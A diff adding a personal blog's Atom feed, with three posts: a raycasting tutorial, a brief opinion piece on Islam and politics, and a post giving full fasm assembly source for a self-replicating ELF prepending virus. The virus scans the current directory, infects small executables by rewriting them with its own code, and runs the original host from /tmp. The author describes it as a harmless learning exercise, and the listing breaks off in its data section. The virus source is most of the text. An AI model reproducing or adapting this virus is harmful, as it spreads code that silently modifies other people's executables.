@@ -1,0 +1,633 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-15T02:28:42+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">amoebatron</title><subtitle>personal blog</subtitle><author><name>Furqan</name></author><entry><title type="html">Raycasting - part 1</title><link href="http://localhost:4000/2023/06/04/raycasting1.html" rel="alternate" type="text/html" title="Raycasting - part 1" /><published>2023-06-04T20:47:30+02:00</published><updated>2023-06-04T20:47:30+02:00</updated><id>http://localhost:4000/2023/06/04/raycasting1</id><content type="html" xml:base="http://localhost:4000/2023/06/04/raycasting1.html"><![CDATA[<h2 id="introduction">Introduction</h2>
+
+<p>Raycasting is a technique in Computer Graphics to create three-dimensional (3D) perspective image from two-dimensional 
+(2D) data. Back in the days, when game development was in its nascency and computer were slow with limited memory, 
+it was one of the efficient ways to create scenes from a player’s perspective. It gained prominence in games like 
+<a href="https://en.wikipedia.org/wiki/Wolfenstein_3D">Wolfenstein 3D</a> and <a href="https://en.wikipedia.org/wiki/Doom_(franchise)">Doom</a>
+which also happened to introduce the concept of <a href="https://en.wikipedia.org/wiki/First-person_shooter">first-person-shooter</a> 
+(FPS) games.</p>
+
+<center>
+<iframe width="560" height="315" src="https://www.youtube.com/embed/561sPCk6ByE" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe>
+</center>
+
+<h2 id="raycasting-algorithm">Raycasting Algorithm</h2>
+
+<h3 id="data-representation">Data Representation</h3>
+
+<p>Before delving into implementation of raycasting, we have to define our game world data in 2D-matrix in which 
+each element corresponds to square cell in the game world with a height, width and breadth of $\textit{cellsize}$. 
+The value “<strong>1</strong>” represents that this cell is a wall and “<strong>0</strong>” represents an empty space where player can move. 
+In the figure below, the player $P$ is standing at $x=2.5, y=0.5$ position and he is looking toward wall with an 
+direction angle $P_\theta$ of 90 degrees. The fraction part of the position indicates that player is standing in the middle of cell. 
+The player also has a <a href="https://en.wikipedia.org/wiki/Field_of_view">Field of View</a> (FOV) angle that represents the total observable area that can be seen at once by 
+player’s eye.</p>
+
+\[map (x, y) = 
+    \begin{bmatrix}
+        0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 \\ 
+        1 &amp; 1 &amp; 0 &amp; 1 &amp; 1 \\
+        0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 \\
+        0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 \\
+        0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 \\
+    \end{bmatrix}\]
+
+\[FOV = 70^\circ\]
+
+\[P_{x,y} = (2.5, 0.5), P_\theta = 90^\circ\]
+
+<center><img src="/assets/images/raycasting/map.svg" width="60%" height="60%" /></center>
+
+<h3 id="casting-rays">Casting Rays</h3>
+<p>In principle, raycasting works by projecting rays from players position across his field of view and tracing them to 
+the point where they intersect with wall, object or nothing. The number of rays that are casted are equal to the width 
+of the screen because each ray is responsible for drawing to its respective column of pixels in the projected screen. 
+After finding intersection points, the distance between the player position and each intersection point is calculated and 
+based on that distance object or wall is drawn into respective column. Objects that are closer to the camera will appear larger, 
+while those farther away will appear smaller, simulating depth perception.</p>
+
+<center><img src="/assets/images/raycasting/rays.svg" width="90%" height="90%" /></center>
+<center><img src="/assets/images/raycasting/perspective.svg" width="90%" height="90%" /></center>
+
+<h3 id="ray-object-intersection">Ray-Object intersection</h3>
+
+<p>Each ray $R_i$ originates from the player position $P_{x,y}$ with an angle $\theta_i$ and before casting rays, 
+their angles must be determined first. Since we know that number of rays are equal to the screen width, 
+then the angle between two consective rays will be $ \frac{FOV}{\textit{screen-width}} $ and left most ray $R_0$ will have an angle
+$ \theta_0 = P_\theta + \frac{FOV}{2} $ so the angle of $i$th ray would be</p>
+
+\[\theta_i = (P_\theta + \frac{FOV}{2}) - i\cdot(\frac{FOV}{\textit{screen-width}})\]
+
+<p>The tracing of rays involves finding all the horizontal and vertical gridlines of the map that particular ray $R_i$
+falls on. On each horizontal gridline we check whether next horizontal cell infront of ray is wall or not and on 
+each vertical gridline we check the same but with vertical cells. If we encounter any cell or wall then 
+we stop at that point and that point is our intersection point $V_{i_{x,y}}$ or $H_{i_{x,y}}$ for ray $R_i$. During tracing, if we dont encounter any object and 
+reach end of the map then we consider our distance to be infinite.</p>
+
+<p>Since player $P_{x,y}$ standing somewhere inside the cell, so we have to find the nearby horizontal $h_{i_{x,y}}$ and 
+vertical $v_{i_{x,y}}$ gridline and that we can find by taking difference between $\textit{cellsize}$ and player position 
+$P_{x,y}$, depending on the direction of the ray $R_i$ (i.e. we have to move backward if $\theta_i \ge 180^\circ$). 
+The directional part can easily be fixed by just multiplying it with sign value of $\cos\theta_i$ (in case of horizontal) and $\sin\theta_i$ (in case of vertical).</p>
+
+<p>The corresponding component can be calculated by the trigonometric ratio $ \tan\theta = \frac{\text{perpendicular}}{\text{base}} $.</p>
+
+\[\begin{align}
+h_x &amp;= \frac{\cos\theta_i}{|\cos\theta_i|}\cdot(cellsize - P_x) \\[2ex] 
+h_y &amp;= h_x\cdot\tan\theta_i \\ 
+\end{align}\]
+
+<p>similarly for vertical gridlines,</p>
+
+\[\begin{align}
+v_y &amp;= \frac{\sin\theta_i}{|\sin\theta_i|}\cdot(cellsize-P_y)\\[2ex] 
+v_x &amp;= \frac{v_y}{\tan\theta_i} \\
+\end{align}\]
+
+<p>After finding initial gridline points, now its time to move to the next gridline points along the ray $R_i$.
+For this, we can a define a <a href="https://www.khanacademy.org/math/algebra/x2f8bb11595b61c86:sequences/x2f8bb11595b61c86:constructing-arithmetic-sequences/a/writing-recursive-formulas-for-arithmetic-sequences">recursive</a>
+function $\textit{next-grid}(x,y)$ that jumps to next gridline point by adding $\textit{cellsize}$
+to the respective component and stops when it encounters an object.</p>
+
+\[\textit{next-grid-h} (x, y) = 
+\begin{cases}
+(x, y), &amp; \textit{if map$( \lfloor\frac{x}{cellsize}\rfloor + \frac{\cos\theta_i}{|\cos\theta_i|}, \lfloor\frac{y}{cellsize}\rfloor) = 1$} \\[2ex]
+\textit{next-grid-h}(\underbrace{x + \frac{\cos\theta_i}{|\cos\theta_i|}\cdot cellsize}_\acute{x}, \acute{x}\cdot\tan\theta_i), &amp; \text{else} \\
+\end{cases}\]
+
+<p>similarly,</p>
+
+\[\textit{next-grid-v}(x,y) = 
+\begin{cases}
+(x, y), &amp;\textit{if map$( \lfloor\frac{x}{cellsize}\rfloor, \lfloor\frac{y}{cell size}\rfloor  + \frac{\sin\theta_i}{|\sin\theta_i|}),= 1$} \\[2ex]
+\textit{next-grid-v}(\frac{\acute{y}}{\tan{\theta_i}}, \underbrace{y + \frac{\sin\theta_i}{|\sin\theta_i|}\cdot cellsize}_{\acute{y}}), &amp; \textit{else} \\
+\end{cases}\]
+
+<p>The pictorial form of ray-object intersection can also be seen below.</p>
+
+<center><img src="/assets/images/raycasting/raytracing.svg" width="90%" height="90%" /></center>
+
+<p>So the intersection points $H_{i_{x,y}}$ and $V_{i_{x,y}}$ that intersects ray will be</p>
+
+\[H_{i_{x,y}} = \textit{next-grid-h}(h_{i_{x,y}})\]
+
+\[V_{i_{x,y}} = \textit{next-grid-v}(v_{i_{x,y}})\]
+
+<p>where $h_{i_{x,y}}$ and $v_{i_{x,y}}$ are nearby gridline points for any $R_i$</p>
+
+<p>Between these two intersection points, only the nearest point will be used in scene rendering because the farthest point
+will always be hidden behind. The intersection point itself has no value for us unless we are applying textures, 
+but we are interested in the distance to nearest intersection point. This can be found by taking minimum of the 
+<a href="https://en.wikipedia.org/wiki/Euclidean_distance">euclidean distances</a> from player position $P_{x,y}$ to both of these points $H_{x,y}$ and $V_{x,y}$</p>
+
+\[\acute{d_i} = \min(\sqrt{ (P_x - H_{i_x} )^2 + (P_y - H_{i_y})^2} ,  \sqrt{ (P_x - V_{i_x} )^2 + (P_y - V_{i_y})^2})\]
+
+<h3 id="fixing-fisheye-lens">Fixing Fisheye-Lens</h3>
+
+<p>Although we have distance now but the distance is not correct and it is actually slightly distorted. If we use this
+distance in drawing our scene, It will give an effect known as <a href="https://en.wikipedia.org/wiki/Fisheye_lens">“fisheye effect”</a>. The reason behind is because the rays
+that are away from the player direction are actually longer in length then the rays that are parallel to player direction
+and these longer rays give an illusion that object is farther away, hence the fisheye
+effect. To fix that is quite simple, all we have to do is multiply distorted distance with cosine of abosulte difference of
+ray angle $\theta_i$ and player direction $P_\theta$.</p>
+
+<center><img src="/assets/images/raycasting/fishbowl-effect.svg" width="90%" height="90%" /></center>
+
+\[d_i = \acute{d_i} \cdot \cos(|\theta_i-P_\theta|)\]
+
+<h3 id="projection">Projection</h3>
+
+<p>The purpose of finding distance to object was to find out the projected height of the object. We have already
+established earlier that everything player see is of same height. Now if we look at the figure below,
+the actual object lies at distance $\overline{OF}$ away from player $P$ with height $\overline{AB}$ and the line $\overline{XY}$ 
+represents the projected height of the object in projection screen, that also lies at certain distance $\overline{OD}$ 
+away from player $P$ in same direction. This gives us two <a href="https://byjus.com/maths/similar-triangles/">similar triangles</a> $ \triangle AOB $ and $ \triangle XOY $ with 
+equal angles that means the ratios of their corresponding sides are equal.</p>
+
+<center><img src="/assets/images/raycasting/triangles.svg" width="90%" height="90%" /></center>
+
+\[\triangle AOB \sim \triangle XOY\]
+
+\[\frac{\overline{XY}}{\overline{AB}} = \frac{\overline{DO}}{\overline{FO}}\]
+
+<p>Since $\overline{AB}$ is $\textit{cellsize}$, $\overline{FO}$ is the distance we calculated earler and $\overline{OD}$ is 
+upto us to decide how much away projection screen from player $P$ should be, that leave us $\overline{XY}$ which is 
+the projected height $h_i$ of the object with which the ray $R_i$ intersects.</p>
+
+\[h_i = \frac{cellsize}{d_i} \cdot \textit{projection-distance}\]
+
+<h3 id="rendering-scene">Rendering Scene</h3>
+
+<p>To render final scene, raycasting uses column-based rendering. In which we iterates through each column $c_i$ in screen 
+and at the center of the pixel column, we fills all corresponding pixels with color of object that intersects with ray $R_i$ 
+at the calculated projected height $h_i$. In each iteration, rest of the pixels are filled with environment color
+e.g. sky, floor … etc.</p>
+
+<center><img src="/assets/images/raycasting/rendering.svg" width="90%" height="90%" /></center>
+
+<p>In the end, after rendering process, we will have a 2D image that represents a 3D scene with illusion of depth and 
+object visibility from 2D data, the demonstration of which can be seen below.</p>
+
+<h1 id="demo">Demo</h1>
+
+<p>Use <strong>W</strong>,<strong>A</strong>,<strong>S</strong> and <strong>D</strong> keys to update $P_{x,y}$ and modify $P_\theta$ with mouse pointer.</p>
+
+<p>Readers are encouraged to open ‘Typescript’ tab and to experiment with different colors, <code class="language-plaintext highlighter-rouge">WORLD_MAP</code> variable and various
+other configurable variables.</p>
+
+<center><iframe height="570" style="width: 100%;" scrolling="no" title="Raycasting" src="https://codepen.io/furqant/embed/XWPRyYv?default-tab=result&amp;editable=true&amp;theme-id=light" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a href="https://codepen.io/furqant/pen/XWPRyYv">
+  Raycasting</a> by Furqan (<a href="https://codepen.io/furqant">@furqant</a>)
+  on <a href="https://codepen.io">CodePen</a>.
+</iframe></center>
+
+<p><em>This blogpost will be divided into two parts and in next part i will write about applying textures and implementing 
+weather effects (fog, night and day) using raycasting</em></p>]]></content><author><name>Furqan</name></author><category term="computer-graphics" /><summary type="html"><![CDATA[Introduction]]></summary></entry><entry><title type="html">Order of Assassins</title><link href="http://localhost:4000/2023/03/29/order-of-assassins.html" rel="alternate" type="text/html" title="Order of Assassins" /><published>2023-03-29T23:40:31+02:00</published><updated>2023-03-29T23:40:31+02:00</updated><id>http://localhost:4000/2023/03/29/order-of-assassins</id><content type="html" xml:base="http://localhost:4000/2023/03/29/order-of-assassins.html"><![CDATA[<center>
+<iframe width="560" height="315" src="https://www.youtube.com/embed/vG8qmlKdRjs" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe>
+</center>
+
+<p>There exists a prevailing notion that Islam, similar to other religions, solely concerns itself with ethics, beliefs, 
+rituals, and prophecies, and that it is going through some kind of ‘bad phase’ or being misused, which is not entirely false.
+However, I believe Islam is different and encompasses much more than that and addresses additional aspects. Although its religious philosophies 
+are not significantly different from other Abrahamic religions, but Islam intersects more extensively with the political and social realms.</p>
+
+<p>Unlike its counterparts, most of the conflicts and sectarian divisions in Islam are not stem from theological differences 
+but from real-world political and social crises, such as power struggles, succession disputes, civil wars, and more.
+The martial elements it possesses are not just a “bug” but they are there by design.</p>
+
+<p>One could argue that Islam is a 
+religion that embodies these political, social, and cultural values, but I consider Islam more as a socio-political framework 
+that encompasses theological ideology.</p>]]></content><author><name>Furqan</name></author><category term="opinions" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">ELF x64 Virus in fasm assembly</title><link href="http://localhost:4000/2022/10/16/elf-x64-virus-fasm.html" rel="alternate" type="text/html" title="ELF x64 Virus in fasm assembly" /><published>2022-10-16T12:47:18+02:00</published><updated>2022-10-16T12:47:18+02:00</updated><id>http://localhost:4000/2022/10/16/elf-x64-virus-fasm</id><content type="html" xml:base="http://localhost:4000/2022/10/16/elf-x64-virus-fasm.html"><![CDATA[<p>Recently, I was playing around with <a href="https://flatassembler.net/">flat assembler</a> and i needed something to
+write in it. I tried <a href="https://en.wikipedia.org/wiki/%22Hello,_World!%22_program">“Hello world” program</a> but it was not
+enough. I believe that generally “Hello world” programs are not a good way to learn about details of a programming 
+language, especially for somewhat experienced programmers.</p>
+
+<p>So I wrote a virus to familiarize myself to it. Because it is compact and has a everything from condition 
+control flows to loop constructs, not just printing out in standard output and it only took me couple of hours to write it.</p>
+
+<p>The virus is a harmless prepending virus which copies itself to the top of the infected program and infected program does 
+absolutley nothing harmful except printing a message that it is infected.
+The virus only infects <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format">ELF</a> 
+files which are present in current directory (not subdirectories) and smaller than 4KB in size to prevent any potential misuse.</p>
+
+<p><strong>CODE: virus.asm</strong></p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; Written by Furqan</span>
+<span class="c1">;</span>
+<span class="c1">; The virus can be assembled with only Fasm.x64 and</span>
+<span class="c1">; make sure to append virus signature</span>
+<span class="c1">; compilation:</span>
+<span class="c1">;   fasm.x64 virus.asm &amp;&amp; printf "\x7e\x49\x4e\x46\x7e" &gt;&gt; virus</span>
+<span class="c1">;</span>
+
+<span class="nf">format</span> <span class="nv">ELF64</span> <span class="nv">executable</span> <span class="mi">3</span>
+
+<span class="nf">segment</span> <span class="nv">readable</span> <span class="nv">executable</span>
+<span class="err">@@:</span>
+    <span class="nf">sub</span> <span class="nb">rsp</span><span class="p">,</span> <span class="mi">2000</span>
+
+    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x2</span>
+    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mi">2008</span><span class="p">]</span>
+    <span class="nf">xor</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rsi</span>
+    <span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>
+    <span class="nf">syscall</span>
+
+    <span class="nf">mov</span> <span class="nv">r9</span><span class="p">,</span> <span class="nb">rax</span>
+
+    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x0</span>
+    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nv">r9</span>
+    <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nv">self</span>
+    <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nv">self_size</span>
+    <span class="nf">syscall</span>
+
+    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x8</span>
+    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nv">r9</span>
+    <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nv">vsignl</span>
+    <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="mh">0x1</span>
+    <span class="nf">syscall</span>
+
+    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x0</span>
+    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nv">r9</span>
+    <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nv">host</span>
+    <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nv">max_size</span>
+    <span class="nf">syscall</span>
+
+    <span class="nf">push</span> <span class="nb">rax</span>
+
+    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x3</span>
+    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nv">r9</span>
+    <span class="nf">syscall</span>
+
+    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x2</span>
+    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nv">cwdd</span>
+    <span class="nf">xor</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rsi</span>
+    <span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>
+    <span class="nf">syscall</span>
+
+    <span class="nf">test</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rax</span>
+    <span class="nf">js</span> <span class="nv">virus</span>
+
+    <span class="nf">push</span> <span class="nb">rax</span>
+
+    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rax</span>
+    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0xd9</span>
+    <span class="nf">lea</span> <span class="nb">rsi</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span> <span class="o">+</span> <span class="mi">200</span> <span class="o">+</span> <span class="nb">DI</span><span class="nv">RENT</span><span class="p">]</span>
+    <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="mi">800</span>
+    <span class="nf">syscall</span>
+
+    <span class="nf">test</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rax</span>
+    <span class="nf">js</span> <span class="nv">finscan</span>
+
+    <span class="nf">mov</span> <span class="nv">r10</span><span class="p">,</span> <span class="nb">rax</span>
+    <span class="nf">xor</span> <span class="nv">r9</span><span class="p">,</span> <span class="nv">r9</span>
+
+<span class="nl">scan:</span>
+    <span class="nf">cmp</span> <span class="p">[</span><span class="nb">rsp</span> <span class="o">+</span> <span class="nv">r9</span> <span class="o">+</span> <span class="mi">200</span> <span class="o">+</span> <span class="nb">DI</span><span class="nv">RENT.d_type</span><span class="p">],</span> <span class="mh">0x8</span>
+    <span class="nf">jne</span> <span class="nv">.continue</span>
+
+    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x2</span>
+    <span class="nf">lea</span> <span class="nb">rdi</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span> <span class="o">+</span> <span class="nv">r9</span> <span class="o">+</span> <span class="mi">200</span> <span class="o">+</span> <span class="nb">DI</span><span class="nv">RENT.d_name</span><span class="p">]</span>
+    <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="mh">0x2</span>
+    <span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>
+    <span class="nf">syscall</span>
+
+    <span class="nf">test</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rax</span>
+    <span class="nf">js</span> <span class="nv">.continue</span>
+
+    <span class="nf">push</span> <span class="nb">rax</span>
+
+    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x0</span>
+    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span><span class="p">]</span>
+    <span class="nf">lea</span> <span class="nb">rsi</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span> <span class="o">+</span> <span class="mi">1100</span><span class="p">]</span>
+    <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="mi">4</span>
+    <span class="nf">syscall</span>
+
+    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nv">elfmagic</span>
+    <span class="nf">mov</span> <span class="nb">rcx</span><span class="p">,</span> <span class="mi">4</span>
+    <span class="nf">rep</span> <span class="nv">cmpsb</span>
+    <span class="nf">jne</span> <span class="nv">.close</span>
+
+    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x8</span>
+    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span><span class="p">]</span>
+    <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nv">self_size</span>
+    <span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>
+    <span class="nf">syscall</span>
+
+    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x0</span>
+    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span><span class="p">]</span>
+    <span class="nf">lea</span> <span class="nb">rsi</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span> <span class="o">+</span> <span class="mi">1100</span><span class="p">]</span>
+    <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nv">vsignl</span>
+    <span class="nf">syscall</span>
+
+    <span class="nf">cmp</span> <span class="nb">rax</span><span class="p">,</span> <span class="nv">vsignl</span>
+    <span class="nf">jl</span> <span class="nv">.infect</span>
+
+    <span class="nf">lea</span> <span class="nb">rsi</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span> <span class="o">+</span> <span class="mi">1100</span><span class="p">]</span>
+    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nv">vsign</span>
+    <span class="nf">mov</span> <span class="nb">rcx</span><span class="p">,</span> <span class="nv">vsignl</span>
+    <span class="nf">rep</span> <span class="nv">cmpsb</span>
+    <span class="nf">je</span> <span class="nv">.close</span>
+
+    <span class="nl">.infect:</span>
+        <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x8</span>
+        <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span><span class="p">]</span>
+        <span class="nf">xor</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rsi</span>
+        <span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>
+        <span class="nf">syscall</span>
+
+        <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x0</span>
+        <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span><span class="p">]</span>
+        <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nv">infected</span>
+        <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nv">max_size</span>
+        <span class="nf">syscall</span>
+
+        <span class="nf">mov</span> <span class="nv">r15</span><span class="p">,</span> <span class="nb">rax</span>
+
+        <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x8</span>
+        <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span><span class="p">]</span>
+        <span class="nf">xor</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rsi</span>
+        <span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>
+        <span class="nf">syscall</span>
+
+        <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x1</span>
+        <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span><span class="p">]</span>
+        <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nv">self</span>
+        <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nv">self_size</span>
+        <span class="nf">syscall</span>
+
+        <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x1</span>
+        <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span><span class="p">]</span>
+        <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nv">vsign</span>
+        <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nv">vsignl</span>
+        <span class="nf">syscall</span>
+
+        <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x1</span>
+        <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span><span class="p">]</span>
+        <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nv">infected</span>
+        <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nv">r15</span>
+        <span class="nf">syscall</span>
+
+    <span class="nl">.close:</span>
+        <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x3</span>
+        <span class="nf">pop</span> <span class="nb">rdi</span>
+        <span class="nf">syscall</span>
+
+    <span class="nl">.continue:</span>
+        <span class="nf">add</span> <span class="nb">r9w</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span> <span class="o">+</span> <span class="nv">r9</span> <span class="o">+</span> <span class="mi">200</span> <span class="o">+</span> <span class="nb">DI</span><span class="nv">RENT.d_reclen</span><span class="p">]</span>
+        <span class="nf">cmp</span> <span class="nv">r9</span><span class="p">,</span> <span class="nv">r10</span>
+        <span class="nf">jl</span> <span class="nv">scan</span>
+
+<span class="nl">finscan:</span>
+    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x3</span>
+    <span class="nf">pop</span> <span class="nb">rdi</span>
+    <span class="nf">syscall</span>
+
+
+<span class="nl">virus:</span>
+
+    <span class="nf">pop</span> <span class="nv">r9</span>
+    <span class="nf">cmp</span> <span class="nv">r9</span><span class="p">,</span> <span class="mi">0</span>
+    <span class="nf">jle</span> <span class="nv">.exit</span>
+
+    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x1</span>
+    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="mh">0x1</span>
+    <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nv">msg</span>
+    <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nv">msgl</span>
+    <span class="nf">syscall</span>
+
+    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x55</span>
+    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nv">tmpf</span>
+    <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="mi">777</span><span class="nv">o</span>
+    <span class="nf">syscall</span>
+
+    <span class="nf">mov</span> <span class="nv">r15</span><span class="p">,</span> <span class="nb">rax</span>
+
+    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x1</span>
+    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nv">r15</span>
+    <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nv">host</span>
+    <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nv">r9</span>
+    <span class="nf">syscall</span>
+
+    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x3</span>
+    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nv">r15</span>
+    <span class="nf">syscall</span>
+
+    <span class="nf">add</span> <span class="nb">rsp</span><span class="p">,</span> <span class="mi">2000</span>
+
+    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x3b</span>
+    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nv">tmpf</span>
+    <span class="nf">xor</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rsi</span>
+    <span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>
+    <span class="nf">syscall</span>
+
+    <span class="nl">.exit:</span>
+        <span class="nf">xor</span>     <span class="nb">edi</span><span class="p">,</span><span class="nb">edi</span>
+        <span class="nf">mov</span>     <span class="nb">eax</span><span class="p">,</span><span class="mi">60</span>
+        <span class="nf">syscall</span>
+
+<span class="nf">segment</span> <span class="nv">readable</span> <span class="nv">writeable</span>
+<span class="nf">cwdd</span> <span class="nv">db</span> <span class="mh">0x2e</span><span class="p">,</span><span class="mh">0x00</span>
+<span class="nf">tmpf</span> <span class="nv">db</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x00</span>
